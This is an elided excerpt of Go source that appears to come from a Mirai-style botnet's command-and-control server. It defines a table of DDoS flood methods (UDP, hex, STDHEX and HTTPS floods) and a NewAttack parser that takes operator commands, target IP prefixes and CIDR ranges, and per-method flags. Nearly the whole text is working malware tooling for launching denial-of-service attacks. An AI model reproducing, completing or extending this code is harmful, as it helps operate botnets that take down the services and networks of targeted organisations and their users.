...
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"udp-strong": AttackInfo{
		0,
		[]uint8{0, 1, 7},
		"std flood (uid1 supported)",
	},
	"hex-flood": AttackInfo{
		1,
		[]uint8{0, 1, 7},
		"HEX flood",
	},
	"strong-hex": AttackInfo{
		2,
		[]uint8{0, 6, 7},
		"STDHEX flood",
	},
	...
	"https": AttackInfo{
		9,
		[]uint8{8, 7, 20, 21, 22, 24},
		"Simple https flood optimized for higher requests",
	},
}
...
func NewAttack(str string, admin int) (*Attack, error) {
	...
	if len(args) == 0 {
		...
		if args[0] == "?" {
			validCmdList := "\x1b[38;5;99mavailable methods:\r\n"
		...
		if !exists {
			return nil, errors.New(fmt.Sprintf("\x1b[38;5;196m%s \x1b[38;5;99mInvalid command !!!!", args[0]))
		}
	...
	if len(args) == 0 {
		...
		if args[0] == "?" {
			return nil, errors.New("\x1b[38;5;99mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
	...
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[38;5;99mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
